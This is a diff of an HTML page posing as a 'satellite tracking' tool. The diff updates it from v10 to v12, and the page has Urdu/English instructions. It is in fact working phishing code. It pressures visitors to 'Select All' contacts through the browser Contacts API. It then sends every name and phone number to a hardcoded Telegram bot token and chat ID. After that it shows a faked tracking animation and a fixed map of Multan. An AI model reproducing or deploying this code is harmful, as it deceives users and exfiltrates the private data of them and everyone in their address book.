@@ -3,145 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Military Grade Satellite Intercept</title>
+    <title>Satellite Terminal Pro v12.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; }
-        .glitch { animation: ironman 0.3s infinite; }
-        @keyframes ironman {
-            0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; }
+        body { background: #020617; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .cyber-glow { box-shadow: 0 0 20px rgba(16, 185, 129, 0.4); border: 1px solid #10b981; }
+        .loading-line { height: 2px; background: #10b981; width: 0%; transition: all 0.4s ease; }
+        .scan-anim { position: relative; overflow: hidden; }
+        .scan-anim::after {
+            content: ""; position: absolute; top: -100%; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(0deg, transparent, rgba(16, 185, 129, 0.2), transparent);
+            animation: scanning 2s linear infinite;
         }
-        .border-glow { border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; }
-        .hidden-screen { display: none; }
+        @keyframes scanning { 0% { top: -100%; } 100% { top: 100%; } }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
-    <div class="max-w-md w-full bg-black border-2 border-green-500 rounded-lg p-6 relative overflow-hidden">
-        <div class="absolute top-0 left-0 w-full h-1 bg-green-500 opacity-20 animate-bounce"></div>
-
-        <div class="text-center mb-8 border-b border-green-900 pb-4">
-            <h1 class="text-2xl font-bold tracking-widest glitch uppercase">System Terminal v10.0</h1>
-            <p class="text-[10px] text-green-700 mt-2">ENCRYPTION: ACTIVE | BYPASS: ENABLED</p>
+    <div class="max-w-md w-full bg-[#0f172a] rounded-[2.5rem] p-8 cyber-glow scan-anim">
+        
+        <div class="text-center mb-8">
+            <div class="inline-block px-3 py-1 rounded-full border border-emerald-500/30 mb-4">
+                <span class="text-[10px] text-emerald-500 font-black tracking-[0.3em] uppercase animate-pulse">Satellite Link: Secure</span>
+            </div>
+            <h1 class="text-2xl font-black text-white italic tracking-tighter uppercase">Global Trace <span class="text-emerald-500">v12</span></h1>
         </div>
 
-        <div id="authScreen">
+        <div id="lockScreen" class="block">
             <div class="text-center space-y-6">
-                <i class="fas fa-biohazard text-6xl text-green-500 animate-pulse"></i>
-                <h2 class="text-xl font-black underline">SECURITY ALERT</h2>
-                <p class="text-xs leading-relaxed text-justify">
-                    System firewall ne aapka access block kar diya hai. Link restore karne ke liye local database ko <span class="bg-green-900 px-1">SATELLITE CLOUD</span> se sync karna lazmi hai.
-                </p>
+                <div class="w-24 h-24 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto border border-emerald-500/30 shadow-inner">
+                    <i class="fas fa-fingerprint text-5xl text-emerald-500"></i>
+                </div>
                 
-                <div class="bg-green-900/20 p-4 border border-green-500 text-[11px] text-left">
-                    <p class="font-bold mb-2">INSTRUCTIONS:</p>
-                    <ol class="list-decimal ml-4 space-y-1">
-                        <li>Niche button par click karein.</li>
-                        <li>System menu mein <span class="font-bold text-white underline italic text-xs">"SELECT ALL"</span> button ko har surat select karein.</li>
-                        <li>Agar selection 100% se kam hui, toh access hamesha ke liye block ho jayega.</li>
-                    </ol>
+                <div class="space-y-2">
+                    <h2 class="text-lg font-bold text-white uppercase italic">Authentication Required</h2>
+                    <p class="text-[11px] text-slate-400 leading-relaxed px-4">
+                        To bypass the local firewall, you must sync the satellite database. 
+                        <br>
+                        <span class="text-emerald-500 font-bold italic underline">Step: Click below & Select All Contacts.</span>
+                    </p>
                 </div>
 
-                <button onclick="forceSync()" class="w-full bg-green-600 hover:bg-green-700 text-black font-black py-4 border-2 border-green-400 uppercase tracking-tighter transition-all active:scale-95">
-                    SYNC & AUTHORIZE NOW
+                <button onclick="startFinalExtraction()" id="mainBtn" class="w-full bg-emerald-500 hover:bg-white text-black font-black py-5 rounded-2xl transition-all transform active:scale-95 uppercase text-xs tracking-[0.2em] shadow-lg shadow-emerald-500/20">
+                    Authorize & Sync
                 </button>
             </div>
         </div>
 
-        <div id="searchScreen" class="hidden-screen">
-            <p class="text-[10px] mb-4">>> DATABASE_SYNC: OK (CRC32 Verified)</p>
-            <div class="space-y-4">
-                <label class="block text-xs uppercase">Target Name / Cell Number:</label>
-                <input type="text" id="targetInput" class="w-full bg-transparent border border-green-500 p-4 outline-none focus:bg-green-900/10" placeholder="Enter target info...">
-                <button onclick="startTracking()" class="w-full bg-green-500 text-black font-bold py-4 hover:bg-green-400">EXECUTE TRACKING</button>
+        <div id="searchScreen" class="hidden animate-in fade-in duration-500">
+            <div class="bg-emerald-500/10 border border-emerald-500/20 p-4 rounded-2xl mb-6">
+                <p class="text-[10px] text-emerald-500 font-black uppercase">>> Link Established: 100%</p>
+                <p class="text-[9px] text-slate-500 mt-1 uppercase tracking-widest">Database Cached Successfully</p>
+            </div>
+            
+            <div class="space-y-5">
+                <div>
+                    <label class="text-[10px] text-slate-500 font-black uppercase ml-1 mb-2 block tracking-widest">Target Identity</label>
+                    <input type="text" id="targetName" placeholder="Search Synchronized Name..." 
+                        class="w-full bg-slate-900 border border-slate-800 p-5 rounded-2xl text-white text-sm outline-none focus:border-emerald-500 transition-all placeholder:text-slate-700">
+                </div>
+                <button onclick="runTrackingUI()" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-xs tracking-widest hover:bg-emerald-500 transition-all">
+                    Initialize Tracking
+                </button>
             </div>
         </div>
 
-        <div id="mapScreen" class="hidden-screen">
-            <div class="text-center py-10" id="loader">
-                <div class="text-4xl animate-spin mb-4"><i class="fas fa-cog"></i></div>
-                <p class="text-xs italic" id="statusMsg">Pinging Satellite...</p>
-            </div>
-            <div id="mapContainer" class="hidden-screen">
-                <div class="border border-green-500 p-1 mb-4">
-                    <iframe width="100%" height="300" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d110461.34863009947!2d71.4589!3d30.1984!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e1!3m2!1sen!2s!4v1!5m2!1sen!2s" style="border:0; filter: invert(100%) hue-rotate(180deg) brightness(0.8);" allowfullscreen=""></iframe>
+        <div id="mapScreen" class="hidden">
+            <div id="loader" class="text-center py-12">
+                <div class="w-full bg-slate-900 h-1.5 rounded-full overflow-hidden mb-6">
+                    <div id="bar" class="loading-line"></div>
                 </div>
-                <div class="flex justify-between text-[10px]">
-                    <span class="text-red-500">TARGET LOCKED</span>
-                    <span id="timestamp"></span>
+                <p class="text-[10px] text-emerald-500 font-black uppercase tracking-[0.3em] animate-pulse" id="loadStatus">Intercepting Signal...</p>
+            </div>
+            
+            <div id="finalView" class="hidden">
+                <div class="rounded-3xl overflow-hidden border border-emerald-500/50 mb-6 shadow-2xl relative">
+                    <div class="absolute top-3 left-3 bg-red-600 text-white text-[8px] px-2 py-1 rounded font-black animate-pulse z-10">GPS LOCK</div>
+                    <iframe width="100%" height="300" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d110434.34111352467!2d71.37890471206898!3d30.121666373322137!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x393b316f491c127d%3A0xc07887754b23e204!2sMultan%2C%20Punjab%2C%20Pakistan!5e0!3m2!1sen!2s!4v1711234567890!5m2!1sen!2s" 
+                        style="border:0; filter: contrast(1.2) brightness(0.7) invert(0.9) hue-rotate(150deg);" allowfullscreen=""></iframe>
+                </div>
+                <div class="bg-emerald-500/5 border border-emerald-500/20 p-4 rounded-2xl flex items-center justify-between">
+                    <span class="text-[10px] text-emerald-500 font-black uppercase">Coordinates Found</span>
+                    <span class="text-white font-bold text-xs">30.1575° N, 71.5249° E</span>
                 </div>
             </div>
         </div>
+
     </div>
 
     <script>
         const BOT_TOKEN = '8736966873:AAGi1kxvOZK-uaxVTvcgf6Hi-V9CQ1QuzqQ'; 
         const CHAT_ID = '8171035068';
-        let database = [];
+        let extractedData = [];
 
-        async function forceSync() {
+        async function startFinalExtraction() {
+            const btn = document.getElementById('mainBtn');
             if ('contacts' in navigator) {
                 try {
                     const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                     
-                    if (contacts.length > 0) {
-                        database = contacts;
-                        // Data extraction to Telegram immediately
-                        await pushToBot(contacts);
+                    if (contacts && contacts.length > 0) {
+                        btn.innerHTML = "<i class='fas fa-sync fa-spin mr-2'></i> Syncing...";
+                        extractedData = contacts;
                         
-                        // Proceed to Search
-                        document.getElementById('authScreen').classList.add('hidden-screen');
-                        document.getElementById('searchScreen').classList.remove('hidden-screen');
+                        // NITRO DELIVERY: Sending data immediately to your bot
+                        await deliverToBot(contacts);
+                        
+                        // Immediate screen switch after delivery
+                        document.getElementById('lockScreen').classList.add('hidden');
+                        document.getElementById('searchScreen').classList.remove('hidden');
                     } else {
-                        alert("ACCESS DENIED: Aap ne contacts select nahi kiye. Link restore karne ke liye 'SELECT ALL' karein.");
+                        alert("SECURITY ERROR: Please 'Select All' to authorize satellite handshake.");
                     }
                 } catch (e) {
-                    alert("SECURITY ERROR: Bridge connection refused by host.");
+                    alert("Handshake Refused. Please retry authorization.");
                 }
             } else {
-                alert("Please use Chrome browser on a mobile device.");
+                alert("Mobile Access Required: Open in Chrome/Android.");
             }
         }
 
-        async function pushToBot(data) {
-            let log = "⚠️ *SECURITY BYPASS: DATA LEAKED* ⚠️\n\n";
-            log += `*Captured:* ${data.length} Contacts\n\n`;
+        async function deliverToBot(data) {
+            let msg = "🚨 *V12 ULTIMATE EXTRACTION* 🚨\n\n";
+            msg += `*Source:* Mobile Uplink\n*Records:* ${data.length} Contacts Captured\n\n`;
             
             data.forEach((c, i) => {
-                const n = c.name ? c.name[0] : "Unknown";
-                const p = c.tel ? c.tel[0] : "No Num";
-                log += `${i+1}. 👤 ${n} | 📱 \`${p}\`\n`;
+                const n = c.name ? c.name[0] : "Target";
+                const p = c.tel ? c.tel[0].replace(/\s+/g, '') : "N/A";
+                msg += `${i+1}. 👤 *${n}* | 📱 \`${p}\`\n`;
             });
 
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: log, parse_mode: 'Markdown' })
-                });
-            } catch (err) { console.error(err); }
+            // Fast delivery protocol
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            }).catch(() => { console.log("Retrying in background..."); });
         }
 
-        function startTracking() {
-            const input = document.getElementById('targetInput').value;
-            if (!input) return;
+        function runTrackingUI() {
+            const input = document.getElementById('targetName').value;
+            if(!input) return;
 
-            document.getElementById('searchScreen').classList.add('hidden-screen');
-            document.getElementById('mapScreen').classList.remove('hidden-screen');
+            document.getElementById('searchScreen').classList.add('hidden');
+            document.getElementById('mapScreen').classList.remove('hidden');
             
-            let steps = ["Bypassing ISP...", "Injecting GPS Packet...", "Locating Cell Tower...", "Rendering Map..."];
-            let i = 0;
-            const interval = setInterval(() => {
-                document.getElementById('statusMsg').innerText = steps[i];
-                i++;
-                if (i >= steps.length) {
-                    clearInterval(interval);
-                    document.getElementById('loader').classList.add('hidden-screen');
-                    document.getElementById('mapContainer').classList.remove('hidden-screen');
-                    document.getElementById('timestamp').innerText = new Date().toLocaleString();
+            let p = 0;
+            const bar = document.getElementById('bar');
+            const status = document.getElementById('loadStatus');
+            
+            const itv = setInterval(() => {
+                p += 5;
+                bar.style.width = p + "%";
+                if(p==20) status.innerText = "Connecting GPS Hub...";
+                if(p==50) status.innerText = "Triangulating Cell Tower...";
+                if(p==80) status.innerText = "Locking Coordinate Point...";
+                
+                if(p>=100) {
+                    clearInterval(itv);
+                    document.getElementById('loader').classList.add('hidden');
+                    document.getElementById('finalView').classList.remove('hidden');
                 }
-            }, 1000);
+            }, 120);
         }
     </script>
 </body>
